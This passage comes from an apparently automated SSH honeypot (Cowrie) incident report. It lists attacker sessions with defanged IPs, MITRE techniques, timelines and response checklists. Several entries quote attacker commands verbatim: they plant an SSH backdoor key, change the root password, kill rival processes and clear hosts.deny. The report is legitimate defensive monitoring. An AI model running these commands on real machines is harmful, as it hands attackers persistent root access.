- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-635ab5457ce8

| Field | Detail |
|---|---|
| **Source IP** | `45.78.194[.]186` |
| **First Seen** | 2026-04-08 08:13 |
| **Last Seen** | 2026-04-08 08:13 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 08:13:37` | `cowrie.session.connect` |
| `2026-04-08 08:13:37` | `cowrie.client.version` |
| `2026-04-08 08:13:38` | `cowrie.client.kex` |
| `2026-04-08 08:13:51` | `cowrie.login.success` |
| `2026-04-08 08:13:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.78.194[.]186` to AbuseIPDB if not already reported
- [ ] Block `45.78.194[.]186` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ffaa818498ca

| Field | Detail |
|---|---|
| **Source IP** | `120.230.181[.]229` |
| **First Seen** | 2026-04-08 08:17 |
| **Last Seen** | 2026-04-08 08:17 |
| **Session Duration** | 26s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:NsQCHlyORFC9"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 08:17:21` | `cowrie.session.connect` |
| `2026-04-08 08:17:21` | `cowrie.client.version` |
| `2026-04-08 08:17:21` | `cowrie.client.kex` |
| `2026-04-08 08:17:22` | `cowrie.login.success` |
| `2026-04-08 08:17:22` | `cowrie.session.params` |
| `2026-04-08 08:17:22` | `cowrie.command.input` |
| `2026-04-08 08:17:22` | `cowrie.command.failed` |
| `2026-04-08 08:17:22` | `cowrie.log.closed` |
| `2026-04-08 08:17:22` | `cowrie.session.params` |
| `2026-04-08 08:17:22` | `cowrie.command.input` |
| `2026-04-08 08:17:23` | `cowrie.session.file_download` |
| `2026-04-08 08:17:23` | `cowrie.log.closed` |
| `2026-04-08 08:17:39` | `cowrie.session.params` |
| `2026-04-08 08:17:39` | `cowrie.command.input` |
| `2026-04-08 08:17:39` | `cowrie.log.closed` |
| `2026-04-08 08:17:39` | `cowrie.session.params` |
| `2026-04-08 08:17:39` | `cowrie.command.input` |
| `2026-04-08 08:17:39` | `cowrie.log.closed` |
| `2026-04-08 08:17:40` | `cowrie.session.params` |
| `2026-04-08 08:17:40` | `cowrie.command.input` |
| `2026-04-08 08:17:40` | `cowrie.session.file_download` |
| `2026-04-08 08:17:40` | `cowrie.log.closed` |
| `2026-04-08 08:17:40` | `cowrie.session.params` |
| `2026-04-08 08:17:40` | `cowrie.command.input` |
| `2026-04-08 08:17:41` | `cowrie.log.closed` |
| `2026-04-08 08:17:41` | `cowrie.session.params` |
| `2026-04-08 08:17:41` | `cowrie.command.input` |
| `2026-04-08 08:17:41` | `cowrie.log.closed` |
| `2026-04-08 08:17:42` | `cowrie.session.params` |
| `2026-04-08 08:17:42` | `cowrie.command.input` |
| `2026-04-08 08:17:42` | `cowrie.command.input` |
| `2026-04-08 08:17:42` | `cowrie.log.closed` |
| `2026-04-08 08:17:42` | `cowrie.session.params` |
| `2026-04-08 08:17:42` | `cowrie.command.input` |
| `2026-04-08 08:17:42` | `cowrie.log.closed` |
| `2026-04-08 08:17:43` | `cowrie.session.params` |
| `2026-04-08 08:17:43` | `cowrie.command.input` |
| `2026-04-08 08:17:43` | `cowrie.log.closed` |
| `2026-04-08 08:17:43` | `cowrie.session.params` |
| `2026-04-08 08:17:43` | `cowrie.command.input` |
| `2026-04-08 08:17:43` | `cowrie.log.closed` |
| `2026-04-08 08:17:44` | `cowrie.session.params` |
| `2026-04-08 08:17:44` | `cowrie.command.input` |
| `2026-04-08 08:17:44` | `cowrie.log.closed` |
| `2026-04-08 08:17:44` | `cowrie.session.params` |
| `2026-04-08 08:17:44` | `cowrie.command.input` |
| `2026-04-08 08:17:44` | `cowrie.log.closed` |
| `2026-04-08 08:17:45` | `cowrie.session.params` |
| `2026-04-08 08:17:45` | `cowrie.command.input` |
| `2026-04-08 08:17:45` | `cowrie.log.closed` |
| `2026-04-08 08:17:45` | `cowrie.session.params` |
| `2026-04-08 08:17:45` | `cowrie.command.input` |
| `2026-04-08 08:17:46` | `cowrie.log.closed` |
| `2026-04-08 08:17:46` | `cowrie.session.params` |
| `2026-04-08 08:17:46` | `cowrie.command.input` |
| `2026-04-08 08:17:46` | `cowrie.log.closed` |
| `2026-04-08 08:17:46` | `cowrie.session.params` |
| `2026-04-08 08:17:46` | `cowrie.command.input` |
| `2026-04-08 08:17:47` | `cowrie.log.closed` |
| `2026-04-08 08:17:47` | `cowrie.session.params` |
| `2026-04-08 08:17:47` | `cowrie.command.input` |
| `2026-04-08 08:17:47` | `cowrie.log.closed` |
| `2026-04-08 08:17:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.230.181[.]229` to AbuseIPDB if not already reported
- [ ] Block `120.230.181[.]229` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6f81703c51d2

| Field | Detail |
|---|---|
| **Source IP** | `39.115.183[.]206` |
| **First Seen** | 2026-04-08 08:19 |
| **Last Seen** | 2026-04-08 08:19 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 08:19:02` | `cowrie.session.connect` |
| `2026-04-08 08:19:02` | `cowrie.client.version` |
| `2026-04-08 08:19:03` | `cowrie.client.kex` |
| `2026-04-08 08:19:03` | `cowrie.login.success` |
| `2026-04-08 08:19:03` | `cowrie.session.params` |
| `2026-04-08 08:19:03` | `cowrie.command.input` |
| `2026-04-08 08:19:03` | `cowrie.command.failed` |
| `2026-04-08 08:19:03` | `cowrie.log.closed` |
| `2026-04-08 08:19:04` | `cowrie.session.params` |
| `2026-04-08 08:19:04` | `cowrie.command.input` |
| `2026-04-08 08:19:04` | `cowrie.session.file_download` |
| `2026-04-08 08:19:04` | `cowrie.log.closed` |
| `2026-04-08 08:19:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `39.115.183[.]206` to AbuseIPDB if not already reported
- [ ] Block `39.115.183[.]206` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-98342c5a370c

| Field | Detail |
|---|---|
| **Source IP** | `39.115.183[.]206` |
| **First Seen** | 2026-04-08 08:19 |
| **Last Seen** | 2026-04-08 08:19 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 08:19:06` | `cowrie.session.connect` |
| `2026-04-08 08:19:06` | `cowrie.client.version` |
| `2026-04-08 08:19:06` | `cowrie.client.kex` |
| `2026-04-08 08:19:07` | `cowrie.login.success` |
| `2026-04-08 08:19:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `39.115.183[.]206` to AbuseIPDB if not already reported
- [ ] Block `39.115.183[.]206` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-24a61cf82e86

| Field | Detail |
|---|---|
| **Source IP** | `5.181.87[.]35` |
| **First Seen** | 2026-04-08 08:20 |
| **Last Seen** | 2026-04-08 08:20 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 08:20:10` | `cowrie.session.connect` |
| `2026-04-08 08:20:10` | `cowrie.client.version` |
| `2026-04-08 08:20:10` | `cowrie.client.kex` |
| `2026-04-08 08:20:11` | `cowrie.login.success` |
| `2026-04-08 08:20:12` | `cowrie.session.params` |
| `2026-04-08 08:20:12` | `cowrie.command.input` |
| `2026-04-08 08:20:12` | `cowrie.command.failed` |
| `2026-04-08 08:20:12` | `cowrie.log.closed` |
| `2026-04-08 08:20:12` | `cowrie.session.params` |
| `2026-04-08 08:20:12` | `cowrie.command.input` |
| `2026-04-08 08:20:12` | `cowrie.session.file_download` |
| `2026-04-08 08:20:12` | `cowrie.log.closed` |
| `2026-04-08 08:20:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `5.181.87[.]35` to AbuseIPDB if not already reported
- [ ] Block `5.181.87[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7384f72bcfbd

| Field | Detail |
|---|---|
| **Source IP** | `5.181.87[.]35` |
| **First Seen** | 2026-04-08 08:20 |
| **Last Seen** | 2026-04-08 08:20 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 08:20:16` | `cowrie.session.connect` |
| `2026-04-08 08:20:16` | `cowrie.client.version` |
| `2026-04-08 08:20:16` | `cowrie.client.kex` |
| `2026-04-08 08:20:17` | `cowrie.login.success` |
| `2026-04-08 08:20:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `5.181.87[.]35` to AbuseIPDB if not already reported
- [ ] Block `5.181.87[.]35` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a9d47c89daba

| Field | Detail |
|---|---|
| **Source IP** | `186.219.184[.]142` |
| **First Seen** | 2026-04-08 08:21 |
| **Last Seen** | 2026-04-08 08:22 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 08:21:54` | `cowrie.session.connect` |
| `2026-04-08 08:21:54` | `cowrie.client.version` |
| `2026-04-08 08:21:54` | `cowrie.client.kex` |
| `2026-04-08 08:21:55` | `cowrie.login.success` |
| `2026-04-08 08:21:56` | `cowrie.session.params` |
| `2026-04-08 08:21:56` | `cowrie.command.input` |
| `2026-04-08 08:21:56` | `cowrie.command.failed` |
| `2026-04-08 08:21:56` | `cowrie.log.closed` |
| `2026-04-08 08:21:57` | `cowrie.session.params` |
| `2026-04-08 08:21:57` | `cowrie.command.input` |
| `2026-04-08 08:21:57` | `cowrie.session.file_download` |
| `2026-04-08 08:21:57` | `cowrie.log.closed` |
| `2026-04-08 08:22:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.219.184[.]142` to AbuseIPDB if not already reported
- [ ] Block `186.219.184[.]142` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6a05fa70e471

| Field | Detail |
|---|---|
| **Source IP** | `186.219.184[.]142` |
| **First Seen** | 2026-04-08 08:22 |
| **Last Seen** | 2026-04-08 08:22 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 08:22:01` | `cowrie.session.connect` |
| `2026-04-08 08:22:01` | `cowrie.client.version` |
| `2026-04-08 08:22:01` | `cowrie.client.kex` |
| `2026-04-08 08:22:03` | `cowrie.login.success` |
| `2026-04-08 08:22:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.219.184[.]142` to AbuseIPDB if not already reported
- [ ] Block `186.219.184[.]142` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c98e9c1c0bf2

| Field | Detail |
|---|---|
| **Source IP** | `186.219.184[.]142` |
| **First Seen** | 2026-04-08 08:25 |
| **Last Seen** | 2026-04-08 08:25 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 08:25:42` | `cowrie.session.connect` |
| `2026-04-08 08:25:42` | `cowrie.client.version` |
| `2026-04-08 08:25:42` | `cowrie.client.kex` |
| `2026-04-08 08:25:44` | `cowrie.login.success` |
| `2026-04-08 08:25:44` | `cowrie.session.params` |
| `2026-04-08 08:25:44` | `cowrie.command.input` |
| `2026-04-08 08:25:44` | `cowrie.command.failed` |
| `2026-04-08 08:25:45` | `cowrie.log.closed` |
| `2026-04-08 08:25:45` | `cowrie.session.params` |
| `2026-04-08 08:25:45` | `cowrie.command.input` |
| `2026-04-08 08:25:46` | `cowrie.session.file_download` |
| `2026-04-08 08:25:46` | `cowrie.log.closed` |
| `2026-04-08 08:25:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.219.184[.]142` to AbuseIPDB if not already reported
- [ ] Block `186.219.184[.]142` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ae1c45a97571

| Field | Detail |
|---|---|
| **Source IP** | `186.219.184[.]142` |
| **First Seen** | 2026-04-08 08:25 |
| **Last Seen** | 2026-04-08 08:25 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 08:25:49` | `cowrie.session.connect` |
| `2026-04-08 08:25:49` | `cowrie.client.version` |
| `2026-04-08 08:25:50` | `cowrie.client.kex` |
| `2026-04-08 08:25:51` | `cowrie.login.success` |
| `2026-04-08 08:25:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.219.184[.]142` to AbuseIPDB if not already reported
- [ ] Block `186.219.184[.]142` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b313f82efa3f

| Field | Detail |
|---|---|
| **Source IP** | `186.219.184[.]142` |
| **First Seen** | 2026-04-08 08:29 |
| **Last Seen** | 2026-04-08 08:29 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 08:29:14` | `cowrie.session.connect` |
| `2026-04-08 08:29:14` | `cowrie.client.version` |
| `2026-04-08 08:29:14` | `cowrie.client.kex` |
| `2026-04-08 08:29:16` | `cowrie.login.success` |
| `2026-04-08 08:29:16` | `cowrie.session.params` |
| `2026-04-08 08:29:16` | `cowrie.command.input` |
| `2026-04-08 08:29:16` | `cowrie.command.failed` |
| `2026-04-08 08:29:17` | `cowrie.log.closed` |
| `2026-04-08 08:29:18` | `cowrie.session.params` |
| `2026-04-08 08:29:18` | `cowrie.command.input` |
| `2026-04-08 08:29:18` | `cowrie.session.file_download` |
| `2026-04-08 08:29:18` | `cowrie.log.closed` |
| `2026-04-08 08:29:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.219.184[.]142` to AbuseIPDB if not already reported
- [ ] Block `186.219.184[.]142` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-de807fff2ea0

| Field | Detail |
|---|---|
| **Source IP** | `186.219.184[.]142` |
| **First Seen** | 2026-04-08 08:29 |
| **Last Seen** | 2026-04-08 08:29 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 08:29:22` | `cowrie.session.connect` |
| `2026-04-08 08:29:22` | `cowrie.client.version` |
| `2026-04-08 08:29:22` | `cowrie.client.kex` |
| `2026-04-08 08:29:23` | `cowrie.login.success` |
| `2026-04-08 08:29:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.219.184[.]142` to AbuseIPDB if not already reported
- [ ] Block `186.219.184[.]142` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-14d1697b9702

| Field | Detail |
|---|---|
| **Source IP** | `5.181.87[.]35` |
| **First Seen** | 2026-04-08 08:30 |
| **Last Seen** | 2026-04-08 08:31 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 08:30:57` | `cowrie.session.connect` |
| `2026-04-08 08:30:57` | `cowrie.client.version` |
| `2026-04-08 08:30:57` | `cowrie.client.kex` |
| `2026-04-08 08:30:58` | `cowrie.login.success` |
| `2026-04-08 08:30:58` | `cowrie.session.params` |
| `2026-04-08 08:30:58` | `cowrie.command.input` |
| `2026-04-08 08:30:58` | `cowrie.command.failed` |
| `2026-04-08 08:30:59` | `cowrie.log.closed` |
| `2026-04-08 08:30:59` | `cowrie.session.params` |
| `2026-04-08 08:30:59` | `cowrie.command.input` |
| `2026-04-08 08:30:59` | `cowrie.session.file_download` |
| `2026-04-08 08:30:59` | `cowrie.log.closed` |
| `2026-04-08 08:31:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `5.181.87[.]35` to AbuseIPDB if not already reported
- [ ] Block `5.181.87[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ae129b53b488

| Field | Detail |
|---|---|
| **Source IP** | `5.181.87[.]35` |
| **First Seen** | 2026-04-08 08:31 |
| **Last Seen** | 2026-04-08 08:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 08:31:02` | `cowrie.session.connect` |
| `2026-04-08 08:31:02` | `cowrie.client.version` |
| `2026-04-08 08:31:02` | `cowrie.client.kex` |
| `2026-04-08 08:31:03` | `cowrie.login.success` |
| `2026-04-08 08:31:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `5.181.87[.]35` to AbuseIPDB if not already reported
- [ ] Block `5.181.87[.]35` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b505ae8cde4e

| Field | Detail |
|---|---|
| **Source IP** | `186.219.184[.]142` |
| **First Seen** | 2026-04-08 08:31 |
| **Last Seen** | 2026-04-08 08:31 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 08:31:07` | `cowrie.session.connect` |
| `2026-04-08 08:31:07` | `cowrie.client.version` |
| `2026-04-08 08:31:07` | `cowrie.client.kex` |
